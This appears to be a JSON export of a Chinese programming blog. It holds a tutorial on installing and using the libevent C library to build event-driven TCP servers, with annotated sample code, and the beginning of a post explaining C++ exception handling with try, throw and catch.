掌握event_base的作用和使用方法 熟练掌握libevent库中的事件循环 掌握event事件的使用方法 掌握bufferevent的工作方式 掌握使用libevent实现TCP服务端流程 掌握使用libevent实现TCP客户端流程 libevent介绍","text":"学习目标 描述什么是libevent并掌握如何安装 掌握event_base的作用和使用方法 熟练掌握libevent库中的事件循环 掌握event事件的使用方法 掌握bufferevent的工作方式 掌握使用libevent实现TCP服务端流程 掌握使用libevent实现TCP客户端流程 libevent介绍 事件驱动、高性能、轻量级、专注于网络 源代码精炼、易读 跨平台 支持多种I&#x2F;O多路复用技术，如epoll、select、poll等 支持I&#x2F;O和信号等事件 libevent的安装libevent登录官方网站，查看相关信息 libevent源码下载主要分2个大版本： 1.4.x系列，较为早期版本，适合源码学习 2.x系列，较新的版本，代码量比1.4版本多很多，功能也更完善。 libevent的核心实现 在linux上，其实质就是epoll反应堆。 libevent是事件驱动，epoll反应堆也是事件驱动，当要检测的事件发生的时候，就会调用事件对应的回调函数，执行相应的操作。特别提醒：事件回调函数是由用户开发的，但是不是由用户显示去调用的，而是由libevent去调用得到。 从官网下载上下载安装文件之后，将安装文件上传到linux系统上；源码包的安装，以2.1.12版本为例，在官网可以下载到源码包tar -zxvf libevent-2.1.12-stable.tar.gz,安装步骤与第三方库源码包安装方式基本一致。 解压libevent-2.1.12-stable.tar.gz 解压：tar -zxvf libevent-2.1.12-stable.tar.gz cd到libevent-2.1.12-stable目录下，查看README文件，该文件里描述了安装的详细步骤，可参照这个文件进行安装 1234./configuremakemake verify # (optional)sudo make install 进入源码目录 执行配置.&#x2F;configure，检测安装环境。生成makefile 执行.&#x2F;configure的时候也可以指定路径，.&#x2F;configure –prefix&#x3D;&#x2F;usr&#x2F;xxxxx,这样就可以安装到指定的目录下，但是这样在进行源代码编译的时候就可以安装到指定的目录下，但是这样在进行源代码编译的时候需要指定用-l头文件的路径和用-L库文件的路径。若默认安装不指定–prefix，则会安装到系统默认的路径下，编译的时候可以不指定头文件和库文件所在的路径。 执行make命令编译整个项目文件 通过执行make命令，会生成一些库文件（动态库和静态库）和可执行文件 执行sudo make install进行安装 安装需要root用户权限，这一步需要输入当前用户的密码 执行这一步，可以将刚刚编译成的库文件和执行文件以及一些头文件拷贝到&#x2F;usr&#x2F;local目录下： 头文件拷贝到了&#x2F;usr&#x2F;local&#x2F;include目录下； 库文件拷贝到了&#x2F;usr&#x2F;local&#x2F;lib目录下 libevent库的使用进入到libevent-2.1.12-stable&#x2F;sample下，可以查看一些实例源代码文件。使用libevent库编写代码在编译程序的时候需要指定库名：-levent； 安装文件的libevent库文件所在路径：libevent-2.1.12-stable&#x2F;.libs; 编写代码的时候用到event.h头文件，或者直接参考sample目录下的源代码文件也可以。 1#include&lt;event2/event.h&gt; 由于安装的时候已经将头文件和库文件拷贝到了系统头文件所在路径&#x2F;usr&#x2F;local&#x2F;include和系统库文件所在路径&#x2F;usr&#x2F;local&#x2F;lib，所以这里编译的时候可以不指定-l和-L 编译源代码文件（以hello-world.c文件为例） 1gcc hello-world.c -levent 测试，编译之后，在文件夹中运行hello-world程序，在另一个中段窗口进行测试，输入：nc 127.1 9995，然后回车立刻显示Hello，World！字符串。 libevent的使用libevent的地基event_base使用libevent函数之前需要分配一个或者多个event_base结构体，每个event_base结构体持有一个事件集合，可以检测以确定哪个事件是激活的，event_base结构相当于epoll红黑树的树根节点，每个event_base都有一种用于检测某种事件已经就绪的”方法”（回调函数） 通常情况下可以通过event_base_new函数获得event_base结构。 相关函数说明： struct event_base* event_base_new(void) //函数说明：获得event_base结构 //参数说明：无 //返回值： // - 成功返回event_base结构体指针 // - 失败返回NULL 1234- ```cpp void event_base_free(struct event_base*) //函数说明：释放event_base指针 int event_reinit(struct event_base* base) //函数说明：如果有子进程，且子进程也要使用base，则子进程需要对event_base重新初始化，此时需要调用event_base重新初始化，此时需要调用event_reinit函数 //函数参数：由event_base_new返回的执行event_base结构的指针 //返回值：成功返回0，失败返回-1 12345678910对于不同系统而言，event_base就是调用不同的多路IO接口去判断事件是否已经被激活，对于linux系统而言，核心调用的就是epoll，同时支持poll和select。查看libevent支持的后端的方法有哪些：- ```cpp const char** event_get_supported_methods(void) //函数说明：获得当前系统（或者称为平台）支持的方法有哪些 //参数：无 //返回值：返回二维数组，类似与main函数的第二个参数**argv const char** event_base_get_method(const struct event_base* base) //函数说明：获得当前base节点使用的多路io方法 //函数参数：event_base结构的base指针 //返回值：获得当前base节点使用的多路io方法的指针 1234567891011121314151617181920212223242526272829303132```cpp//测试当前系统支持的libevent方法和当前使用的方法#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;event2/event.h&gt;int main()&#123; int i = 0; //获取当前系统支持的方法 const char** p = event_get_supported_methods(); while (p[i] != NULL) &#123; printf(&quot;%s \\t&quot;, p[i++]); &#125; printf(&quot;\\n&quot;); //获取地基节点 struct event_base* base = event_base_new(); if (base == NULL) &#123; printf(&quot;event_base_new error\\n&quot;); return -1; &#125; //读取当前系统使用的方法 const char** pp = event_base_get_method(base); printf(&quot;%s\\n&quot;, pp); //释放地基节点 event_base_free(base); return 0;&#125; 运行结果为： epoll poll selectepoll 等待事件产生-循环等待event_looplibevent在地基打好之后，需要等待事件的产生，也就是等待事件被激活后，所以程序不能退出，对于epoll来说，我们需要自己控制循环，而在libevent中也给我们提供了API接口，类似where(1)的功能。 函数如下： 1234567891011int event_base_loop(struct event_base* ，int flag)//函数说明：进入循环等待事件//参数说明// - base：由event_base_new函数返回的指向event_base结构的指针// - flags的取值：// - #define EVLOOP_ONCE 0x01 只触发一次，如果事件没有被触发，阻塞等待// - #define EVLOOP_NONBLOCK 0x02 非阻塞方式检测事件是否被处罚法，不管事件触发与否，都会立即返回// - base：由event_base_new函数返回的指向event_base结构的指针// - flags的取值：// - #define EVLOOP_ONCE 0x01 只触发一次，如果事件没有被触发，阻塞等待// - #define EVLOOP_NONBLOCK 0x02 非阻塞方式检测事件是否被处罚法，不管事件触发与否，都会立即返回 这个函数一般不用，而大多数都调用libevent给我们提供的另外一个API： 1234int event_base_dispath(struct event_base* base)//函数说明：进入循环等待事件//参数说明：由event_base_new函数返回的指向event_base结构的指针//调用该函数，相当于没有设置标志位的event_base_loop。程序将会一直运行，知道没有需要检测的事件了，或者结束循环的API终止 调用该函数，相当于没有设置标志位的event_base_loop。程序将会一直运行，直到没有需要检测的事件了，或者被结束循环的API终止。 1234567int event_base_loopexit(struct event_base* base, const struct timeval* tv)int event_base_loopbreak(struct event_base* base)struct timeval&#123; long tv_sec; long tv_usec;&#125; 两个函数的区别是如果正在执行激活事件的回调函数，那么event_base_loopexit将在事件回调执行结束后终止循环（如果tv事件非NULL，那么将等待tv设置的时间后立即结束循环），而event_base_loopbreak会立即终止循环。 使用libevent库的步骤 创建根节点–event_base_new 设置监听事件和数据可读可写的事件的回调函数，设置了事件对应的回调函数以后，当事件产生的时候会自动调用回调函数 事件循环–event_base_dispatch，相当于while(1),在循环内部等待事件的发生，若有事件发生则会触发事件对应的回调函数。 释放根节点–event_base_free，释放由event_base_new和event_new创建的资源，分别调用event_base_free和event_free函数。 事件驱动-event事件驱动实际上libevent的核心思想，主要的状态转化 主要的几个状态： 无效的指针：此时仅仅是定义了struct event *ptr 非未决：相当于创建了事件，但是事件还没有处于被监听状态，类似于我们使用epoll的时候定义了struct epoll_event ev并且对ev的两个字段进行了赋值，但是此时尚未调用epoll_ctl对事件上述。 未决：就是对事件开始监听，暂时未有事件产生。相当于调用epoll_ctl对要监听的事件上树，但是没有事件产生。 激活：代表监听的事件已经产生，这时需要处理，相当于调用epoll_wait函数有返回，当事件被激活以后，libevent会调用该事件对应的回调函数。 libevent的事件驱动对应的结构体为struct event，对应的函数在图上也比较清晰。 typedef void(*event_callback_fn)(evutil_socket_t fd, short events, event_callback_fn cb, void* arg) 123456789101112131415- ```cpp struct event* event_new(struct event_base* base, evutil_socket_t fd, short events, event_callback_fn cb, void* arg) //函数说明：event_new负责创建event结构指针，同时指定对应的地基base，还有对应的文件描述符，事件，以及回调函数和回调函数的参数 //参数说明： // - base：对应的根节点--地基 // - fd：要监听的文件描述符 // - events：要监听的事件 // - #define EV_TIMEOUT 0x01 //超时事件 // - #define EV_READ 0x02 //读事件 // - #define EV_WRITE 0x04 //写事件 // - #define EV_SIGNAL 0x08 //信号触发 // - #define EV_PERSIST 0x10 //周期性触发 // - #define EV_ET 0x20 //边缘触发，如果底层模型支持设置则有效，若不支持则无效 // - 若要想设置持续的读事件则：EV_READ|EV_PERSIST cb回调函数，原型如下： typedef void(*event_callback_fn)(evutil_socket_t fd,short events,void *arg) 123456 注意：回调函数的参数就对应于event_new函数的fd，event和arg- ```cpp #define evsignal_new(b,x,cb,arg) event_new((b),(x),EV_SIGNAL|EV_PRESIST,(cb),(arg)) int event_add(struct event* ev, const struct timeval* timeout) //函数说明：将非未决态事件转为未决态，相当于调用epoll_ctl函数（EPOLL_CTL_ADD），开始监听事件是否产生，相当于epoll的上树操作 //参数说明： // - ev：调用event_new创建的事件 // - timeout：限时等待事件的产生，也可以设置为NULL，没有限时。 12345- ```cpp int event_del(struct event* ev) //函数说明：将事件从未决态变为非未决态，相当于epoll的下树（epoll_ctl调用EPOLL_CTL_DEL操作）操作 //参数说明：ev指的是由event_new创建的事件 void event_free(struct event* ev) //函数说明：释放由event_new申请的event节点 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143# 编写一个基于event实现的tcp服务器总体步骤：1. 搭建服务器固定三步，标出的三步： - &lt;mark&gt;创建socket---socket()&lt;/mark&gt; - 设置端口复用---setsockopt(lfd,SOL_SOCKET,SO_REUSEADDR,&amp;opt,sizeof(int)) - &lt;mark&gt;绑定bind---bind()&lt;/mark&gt; - &lt;mark&gt;监听listen---listen()&lt;/mark&gt; - 创建地基---struct event_base *base = event_base_new()（下面的第二步） - 创建lfd对应的事件节点---struct event *ev = event_new(base,lfd，EV_READ|EV_PERSIST,conncb,NULL)(下面的第三步) - 上event_base地基---event_add(ev,NULL) - 进入事件循环---event_base_dispatch(base)(下面的第四步) - 释放资源--event_base_free(base),event_free(ev) - 2. 调用event_base_new函数创建event_base节点3. 创建要监听的事件event，主要就是监听事件和读数据的事件 - 设置好监听事件的回调函数，然后event_add上树 - 有新的连接，则调用accept接受新的连接 - 将这个新的连接设置好回调函数（一般是设置读事件），然后继续event_add上述，若有客户端关闭连接则从树上摘除该事件节点4. 调用event_base_dispatch进入循环等待事件的发生# libevent服务端程序的代码实现```cpp#include&lt;unistd.h&gt;#include&lt;arpa/inet.h&gt;#include&lt;netinet/in.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;event2/event.h&gt;struct event* connev = NULL;void readcb(evutil_socket_t fd, short events, void* arg)&#123; int n; char buf[1024]; memset(buf, 0x00, sizeof(buf)); n = read(fd, buf, sizeof(buf)); if (n &lt;= 0) &#123; close(fd); //将通信文件描述符对应的事件从base地基上删除 event_del(connev); return; &#125; else &#123; write(fd, buf, n); &#125; write(fd, buf, n);&#125;void conncb(evutil_socket_t fd, short events, void* arg)&#123; struct event_base* base = (struct event_base*)arg; //接受新的客户端连接 int cfd = accept(fd, NULL, NULL); if (cfd &gt; 0) &#123; //创建通信描述符对应的事件并设置回调函数为readcb struct event* connev = event_new(base, cfd, EV_READ | EV_PERSIST, readcb, NULL); if (connev == NULL) &#123; //退出循环 event_base_loopexit(base, NULL); &#125; //将通信文件描述符对应的事件上event_base地基 event_add(connev, NULL); &#125;&#125;int main()&#123; //创建socket int fd = socket(AF_INET, SOCK_STREAM, 0); //设置端口复用 int opt = 1; setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt)); //绑定 struct sockaddr_in serv; bzero(&amp;serv, sizeof(serv)); serv.sin_addr.s_addr = htonl(INADDR_ANY); serv.sin_port = htons(8888); serv.sin_family = AF_INET; bind(fd, (struct sockaddr*)&amp;serv, sizeof(serv)); //监听 listen(fd, 120); //创建地基 struct event_base* base = event_base_new(); if (base == NULL) &#123; printf(&quot;event_base_new error\\n&quot;); return -1; &#125; //创建监听文件描述符对应的事件 struct event* ev = event_new(base, fd, EV_READ | EV_PERSIST, conncb, base); if (ev == NULL) &#123; printf(&quot;event_new error\\n&quot;); return -1; &#125; //将新的事件节点上base地基 event_add(ev, NULL); //进入事件循环等待 event_base_dispatch(base); //释放资源 event_base_free(base); event_free(ev); close(fd); return 0; &#125; libevent服务端程序测试和错误分析使用下面命令打开客户端： 1nc 127.1 8888 使用下面命令查看对应的端口状态： 1netstat -anp | grep 8888 分析之后，根据上述代码，只要关闭最后一个客户端时，也会影响到别的客户端。 自带buffer的事件buffereventbufferevent实际上也是一个event，只不过比普通的event高级一些，它的内部有两个缓冲区，以及一个文件描述符（网络套接字）。一个网络套接字有读和写两个缓冲区，bufferevent同样也带有两个缓冲区，还有就是libevent事件驱动的核心回调函数，那么四个缓冲区以及触发回调的关系如下： 从图中可以得知，一个bufferevent对应两个缓冲区，三个回调函数，分别是写回调，读回调和事件回调。 bufferevent有三个回调函数： 读回调 - 当bufferevent将底层读缓冲区的数据读到自身的读缓冲区时触发读事件回调 写回调 - 当bufferevent将自身写缓冲的数据写到底层写缓冲区的时候触发写事件回调，由于数据最终是写入了内核的写缓冲区中，应用程序以及无法控制，这个事件对于应用程序来说基本没什么用，只是通知功能。 事件回调 - 当bufferevent绑定的socket连接，断开或者异常的时候触发事件回调。 bufferevent的读事件触发时机 当数据由内核的读缓冲区到 bufferevent的读缓冲区的时候，会触发bufferevent读事件回调 需要注意的是：数据由内核到bufferevent的过程不是用户程序做的，是由bufferevent内部操作的。 bufferevent的写事件触发时机 当用户程序将数据写到bufferevent的写缓冲区之后，bufferevent会自动将数据写到内核的写缓冲区，最终有内核程序将数据发送出去。 事件回调： 当bufferevent绑定的socket连接，断开或者异常的时候触发事件回调。 主要使用的函数如下： 12345678struct bufferevent *bufferevent_socket_new(struct event_base *base,evutil_socket_t fd,int options);//函数说明：bufferevent_socket_new对已经存在socket创建bufferevent事件，可用于后面讲到的连接监听器的回调函数中//参数说明：// base：对应根节点// fd：文件描述符// options：bufferevent的选项// BEV_OPT_CLOSE_ON_FREE --释放bufferevent自动关闭底层接口（当bufferevent被释放以后，文件描述符也随之被close// BEV_OPT_THREADSAFE --使bufferevent能够在多线程下是安全的 12345678int bufferevent_socket_connect(struct bufferevent *bev,struct sockaddr *serv,int socklen);//函数说明：该函数封装了底层的socket与connect接口，通过调用此函数，可以将bufferevent事件与通信的socket进行绑定//参数说明：// bev -- 需要提前初始化的bufferevent事件// serv -- 对端（一般指服务端）的ip地址，端口，协议的结构指针// socklen -- 描述serv的长度//说明：调用此函数以后，通信的socket与bufferevent缓冲区做了绑定，后面调用了bufferevent_setcb函数以后，//会对bufferevent缓冲区的读写操作的事件设置回调函数，当往缓冲区中写数据的时候会触发写回调函数，当数据从socket的内核缓冲区读到bufferevent读缓冲区中的时候会触发读回调函数 12void bufferevent_free(struct bufferevent *bufev);//函数说明 ：释放bufferevent 1234void bufferevent_setcb(struct bufferevent *bufev, bufferevent_data_cb readcb, bufferevent_data_cb writecb, bufferevent_event_cb eventcb,void *cbarg);//函数说明：bufferevent_setcb用于设置bufferevent的回调函数，readcb,writecb,eventcb分别对应了读回调，写回调，事件回调，cbarg代表回调函数的参数。 回调函数如下： 1typedef void (*bufferevent_data_cb)(struct bufferevent *bev ,void *ctx); 123456typedef void (*bufferevent_event_cb)(struct bufferevent *bev,short what,void *ctx);//What代表对应的事件//BEV_EVENT_EOF遇到文件结束提示//BEV_EVENT_ERROR发生错误//BEV_EVENT_TIMEOUT发生超时//BEV_EVENT_CONNECTED请求的过程中连接已经完成 12int bufferevent_write(struct bufferevent *bufev,const void *data,size_t size);//bufferevent_write是将data的数据写到bufferevent的写缓冲区 12int bufferevnet_write_buffer(struct bufferevent *bufev,struct evbuffer *buf);//bufferevent_write_buffer 是将数据写到缓冲区另外一个写法，实际上bufferevent的内部的两个缓冲区结构就是struct evbuffer 12size_t bufferevent_read(struct bufferevent *bufev,void *data,size_t size);//bufferevent_read是将bufferevent的读缓冲区数据读到data中，同时将读到的数据从bufferevent的读缓冲清除。 链接监听器-evconnlistener链接监听器封装了底层的socket通信相关函数，比如socket，bind，listen，accept这几个函数。链接监听器创建后实际上相当于调用了socket，bind，listen，此时等待新的客户端链接到来，如果又新的客户端连接，那么内部先进行调用accept处理，然后调用用户指定的回调函数。可以先看看函数原型，了解一下他是怎么运作的： 函数声明所在的头文件：event2&#x2F;listener.h 1234567891011121314struct evconnlistener *evconnlistener_new_bind(struct event_base *base, evconnlistener_cb cb,void *ptr,unsigned flags,int backlog, const struct sockaddr *sa,int socklen);//函数说明：// 是在当前没有套接字的情况下对链接监听器进行初始化，看最后2个参数实际上//就是bind使用的关键参数，backlog是listen函数的关键参数（略有不同的是，如果//backlog是-1，那么监听器会自动选择一个合适的值，如果填0，那么监听器会认为//listen函数是已经被调用过了），ptr是回调函数的参数，cb是有新链接之后的回调//函数，但是注意这个回调函数触发的时候，链接器已经处理好新连接了，并将与新连接//通信的描述符交给回调函数。flags需要参考几个值：// LEV_OPT_LEAVE_SOCKETS_BLOCKING 文件描述符为阻塞的// LEV_OPT_CLOSE_ON_FREE 关闭时自动释放// LEV_OPT_REUSEABLE 端口复用// LEV_OPT_THREADSAFE 分配锁，线程安全 12345struct evconnlistener *evconnlistener_new(struct event_base *base, evconnlistener_cb cb,void *ptr,unsigned flags,int backlog, evutil_socket_t fd);//evconnlistener_new函数与前一个函数不同的地方在与后两个参数，使用本函数时，//认为socket已经初始化好，并且bind完成，甚至也可以做完listen，所以大多数时候，我们都可以使用第一个函数 两个函数的回调函数： 12typedef void (*evconnlistener_cb)(struct evconnlistener *evl,evutil_socket fd,struct sockaddr *cliaddr,int socklen,void *ptr);//回调函数fd参数是与客户端通信的描述符，并非是等待连接的监听的那个描述符，所以cliaddr对应的也是新连接的对端地址信息，已经是accept处理好的 12void evconnlistener_free(struct evconnlistener *lev);//函数说明：释放连接监听 12int evconnlistener_enable(struct evconnlistener *lev);//函数说明：使链接监听器生效 12int evconnlistener_disable(struct evconnlistener *lev);//函数说明：使链接监听器失效 如果上述函数都较为了解了，可以尝试去看懂hello-world.c的代码，在安装包sample目录下，其中有涉及到信号的函数，看看自己能否找到函数的原型在哪？实际上就是一个宏定义，也是我们之前介绍的event_new函数，只是对应一个信号事件而已，处理机制略有不同。 libevent代码分析和阅读123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156/* This example program provides a trivial server program that listens for TCP connections on port 9995. When they arrive, it writes a short message to each client connection, and closes each connection once it is flushed. Where possible, it exits cleanly in response to a SIGINT (ctrl-c).*/#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#ifndef _WIN32 //这个程序也可以在win32运行#include &lt;netinet/in.h&gt;# ifdef _XOPEN_SOURCE_EXTENDED# include &lt;arpa/inet.h&gt;# endif#include &lt;sys/socket.h&gt;#endif#include &lt;event2/bufferevent.h&gt;#include &lt;event2/buffer.h&gt;#include &lt;event2/listener.h&gt;#include &lt;event2/util.h&gt;#include &lt;event2/event.h&gt;static const char MESSAGE[] = &quot;Hello, World!\\n&quot;; //消息static const int PORT = 9995;static void listener_cb(struct evconnlistener *, evutil_socket_t, struct sockaddr *, int socklen, void *);static void conn_writecb(struct bufferevent *, void *);static void conn_eventcb(struct bufferevent *, short, void *);static void signal_cb(evutil_socket_t, short, void *);intmain(int argc, char **argv)&#123; struct event_base *base; //地基 struct evconnlistener *listener; //链接监听器 struct event *signal_event; //信号事件 struct sockaddr_in sin = &#123;0&#125;;#ifdef _WIN32 WSADATA wsa_data; WSAStartup(0x0201, &amp;wsa_data);#endif //创建地基 相当于epoll的树根(epoll_create) base = event_base_new(); if (!base) &#123; fprintf(stderr, &quot;Could not initialize libevent!\\n&quot;); return 1; &#125; sin.sin_family = AF_INET; sin.sin_port = htons(PORT); //创建链接监听器 socket-bind-listen-accept //listener_cb 回调函数 //LEV_OPT_REUSEABLE|LEV_OPT_CLOSE_ON_FREE 设置端口复用，当链接监听器释放的时候关闭套接字(监听文件描述符) listener = evconnlistener_new_bind(base, listener_cb, (void*)base, LEV_OPT_REUSEABLE|LEV_OPT_CLOSE_ON_FREE, -1, (struct sockaddr*)&amp;sin, sizeof(sin)); if (!listener) &#123; fprintf(stderr, &quot;Could not create a listener!\\n&quot;); return 1; &#125; //设置SIGINT信号的事件回调 signal_event = evsignal_new(base, SIGINT, signal_cb, (void*)base); if (!signal_event || event_add(signal_event, NULL) &lt; 0) &#123; fprintf(stderr, &quot;Could not create/add a signal event!\\n&quot;); return 1; &#125; //进入等待事件循环 相当于while(1) event_base_dispatch(base); //释放资源 evconnlistener_free(listener); event_free(signal_event); event_base_free(base); printf(&quot;done\\n&quot;); return 0;&#125;//listener:链接监听器//fd:通信文件描述符//sa和socklen:客户端IP地址信息//user_data:参数static voidlistener_cb(struct evconnlistener *listener, evutil_socket_t fd, struct sockaddr *sa, int socklen, void *user_data)&#123; struct event_base *base = user_data; struct bufferevent *bev; //创建bufferevent缓冲区 //BEV_OPT_CLOSE_ON_FREE:bufferevent释放的时候自动关闭通信描述符 bev = bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE); if (!bev) &#123; fprintf(stderr, &quot;Error constructing bufferevent!&quot;); event_base_loopbreak(base);//退出循环，程序结束 return; &#125; //设置回调函数:读回调，写回调，事件回调 bufferevent_setcb(bev, NULL, conn_writecb, conn_eventcb, NULL); //使bufferevent设置生效 bufferevent_enable(bev, EV_WRITE); //使bufferevent设置失效 bufferevent_disable(bev, EV_READ); bufferevent_write(bev, MESSAGE, strlen(MESSAGE));&#125;static voidconn_writecb(struct bufferevent *bev, void *user_data)&#123; struct evbuffer *output = bufferevent_get_output(bev); if (evbuffer_get_length(output) == 0) &#123; printf(&quot;flushed answer\\n&quot;); bufferevent_free(bev); &#125;&#125;static voidconn_eventcb(struct bufferevent *bev, short events, void *user_data)&#123; if (events &amp; BEV_EVENT_EOF) &#123; printf(&quot;Connection closed.\\n&quot;); &#125; else if (events &amp; BEV_EVENT_ERROR) &#123; printf(&quot;Got an error on the connection: %s\\n&quot;, strerror(errno));/*XXX win32*/ &#125; /* None of the other events can happen here, since we haven&#x27;t enabled * timeouts */ bufferevent_free(bev);&#125;static voidsignal_cb(evutil_socket_t sig, short events, void *user_data)&#123; struct event_base *base = user_data; struct timeval delay = &#123; 2, 0 &#125;; printf(&quot;Caught an interrupt signal; exiting cleanly in two seconds.\\n&quot;); event_base_loopexit(base, &amp;delay);&#125; bufferevent和链接监听器代码流程图","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"网络编程","slug":"编程语言/C/网络编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[]},{"title":"C++学习 异常","slug":"C++-学习-异常","date":"2023-07-01T01:44:22.000Z","updated":"2023-07-03T03:28:46.636Z","comments":true,"path":"2023/07/01/C++-学习-异常/","link":"","permalink":"http://example.com/2023/07/01/C++-%E5%AD%A6%E4%B9%A0-%E5%BC%82%E5%B8%B8/","excerpt":"异常的基本概念提供异常的基本目的就是为了处理上面的问题。基本思想是：让一个函数在发现了自己无法处理的错误时抛出（throw）一个异常，然后它的（直接或者间接）调用者能够处理这个问题。将问题检测和问题处理相分离。 一种思想：在所有支持异常处理的编程语言中（例如java)，要认识到的一个思想：在异常处理过程中，由问题检测代码可以抛出一个对象给问题处理代码，通过这个对象的类型和内容，实际上完成了两个部分的通信，通信的内容是：出现了上面错误。当然，各种语言对异常的具体实现有着或多或少的区别，但是这个通信的思想是不变的。","text":"异常的基本概念提供异常的基本目的就是为了处理上面的问题。基本思想是：让一个函数在发现了自己无法处理的错误时抛出（throw）一个异常，然后它的（直接或者间接）调用者能够处理这个问题。将问题检测和问题处理相分离。 一种思想：在所有支持异常处理的编程语言中（例如java)，要认识到的一个思想：在异常处理过程中，由问题检测代码可以抛出一个对象给问题处理代码，通过这个对象的类型和内容，实际上完成了两个部分的通信，通信的内容是：出现了上面错误。当然，各种语言对异常的具体实现有着或多或少的区别，但是这个通信的思想是不变的。 一句话：异常处理就是处理程序中的错误。所谓错误是指在程序运行的过程中发生的一些异常事件（如：除0溢出，数组下标越界，所要读取的文件不存在，空指针，内存不足等等）。 我们以前编写的程序是如何处理异常？ 在C语言的世界中，对错误的处理总是围绕着两种方法：一是使用整型的返回值标识错误；二是使用emo宏（可以简单的理解为一个全局整型变量）去记录错误。当然C++仍然是可以用两种方法的。这两种方法最大的缺陷就是会出现不一致的问题。例如有些函数返回1表示成功，返回0表示出错；而有些函数返回0表示成功，返回非0表示出错。 还有一个缺点就是函数的返回值只有一个，你通过函数的返回值表示错误代码，那么函数就不能返回其他的值。当然，你也可以通过指针或者C++的引用来返回另外的值，但是这样可能会令你的程序略微晦涩难懂。 C++异常机制相比C语言异常处理的优势？ 函数的返回值可以忽略，但异常不可忽略。如果程序出现异常，但是没有被捕获，程序就会终止，这多少会促使程序员开发出来的程序更健壮一点。而如果使用C语言的error宏或者函数返回值，调用者都有可能忘记检查，从而没有对错误进行处理，结果造成程序莫名其妙的终止或者出现错误的结果。 整型返回值没有任何寓意信息。而异常缺包含语义信息，有时你从类名就能够体现出来。 整型返回值缺乏相关的上下文信息，异常作为一个类，可以拥有自己的成员，这些成员就可以传递足够的信息。 异常处理可以在调用跳级。这是一个代码编写时的问题：假设在有多个函数的调用栈中出现了某个错误，使用整型返回码要求你在每一级函数中都要进行处理。而使用异常处理的栈展开机制，只需要在一处进行处理就可以了，不需要每级函数都处理。 C++的异常必须要有函数进行处理，如果没有任何处理，程序会中断。 12345678910111213141516171819202122232425262728#include&lt;iostream&gt;using namespace std;int myDivision(int a,int b)&#123; if (b == 0) &#123; return -1; &#125; return a / b;&#125;void test01() &#123; int a = 10; int b = 0; //a=10,b=-1时，返回也为-1，也会进行异常处理 //C语言处理异常有缺陷，返回值不统一，无法区分时结果还是异常 int ret = myDivision(a, b); if (ret == -1) &#123; cout &lt;&lt; &quot;异常&quot; &lt;&lt; endl; &#125;&#125;int main()&#123; test01();&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include&lt;iostream&gt;using namespace std;class MyException&#123;public: void printError() &#123; cout &lt;&lt; &quot;我自己的异常&quot; &lt;&lt; endl; &#125;&#125;;int myDivision(int a,int b)&#123; if (b == 0) &#123; //throw &#x27;a&#x27;;//返回int类型的异常 throw MyException();//抛出MyException的匿名对象 &#125; return a / b;&#125;void test01() &#123; int a = 10; int b = 0; try &#123; myDivision(a, b); &#125; catch (int) &#123; cout &lt;&lt; &quot;int类型异常捕获&quot; &lt;&lt; endl; &#125; catch (char) &#123; //捕获到了异常，但是不想处理，继续向上抛出这个异常 //异常必须有函数进行处理，如果没有任何处理，程序自动调用terminate函数，让程序中断 throw; cout &lt;&lt; &quot;char类型异常捕获&quot; &lt;&lt; endl; &#125; catch (double) &#123; cout &lt;&lt; &quot;double类型异常捕获&quot; &lt;&lt; endl; &#125; catch (MyException e) &#123; e.printError(); &#125; catch (...) &#123; cout &lt;&lt; &quot;其他类型异常捕获&quot; &lt;&lt; endl; &#125;&#125;int main()&#123; try &#123; test01(); &#125; catch (double) &#123; cout &lt;&lt; &quot;main函数中double类型异常捕获&quot; &lt;&lt; endl; &#125; catch (char) &#123; cout &lt;&lt; &quot;main函数中char类型异常捕获&quot; &lt;&lt; endl; &#125; catch (...) &#123; cout &lt;&lt; &quot;main函数中其他类型异常捕获&quot; &lt;&lt; endl; &#125;&#125; 运行结果为： 我自己的异常 总结 若有异常则通过throw操作创建一个异常对象并抛出。 将可能抛出异常的程序放到try块之中。 如果在try段执行期间没有引起异常，那么跟在try后面的catch字句就不会执行。 catch子句会根据出现的先后顺序被检查，匹配的catch语句捕获并处理异常（或继续抛出异常）。 如果匹配的处理来找到，则运行函数terminate将自动被调用，其缺省功能调用abort终止程序。 处理不了的异常，可以在catch的最后一个分支，使用throw，向上抛。 C++异常处理使得异常的引发和异常的处理不必在一个函数中，这样底层的函数可以着重解决问题，而不必过多的考虑异常的处理，上层调用者可以在适当的位置设计对不同类型异常的处理。 异常的基本语法 C++异常的处理关键字 try throw catch 可以出现异常的代码，放到try块 利用throw抛出异常 利用catch捕获异常 catch（类型），如果想捕获其他类型 catch（…) 如果捕获到的异常不想处理，而继续向上抛出，利用throw 异常必须有函数进行处理，如果都不去处理，程序自动调用terminate函数，中断掉 异常可以是自定义数据类型 异常是严格类型匹配 栈解旋 从try代码块开始，到throw抛出异常之前，所有栈上的数据都会被释放掉 释放的顺序和创建的顺序相反，这个过程我们称为栈解旋 异常接口声明 为了加强程序的可读性，可以在函数声明中列出可能抛出异常的所有类型，例如：void func() throw(A,B,C)；这个函数func能够且只能够抛出类型A，B，C及其子类型的异常 如果在函数声明中没有包含异常的接口声明，则此函数可以抛任何类型的异常，例如：void func() 一个不抛任何异常的函数可声明为：void func throw() 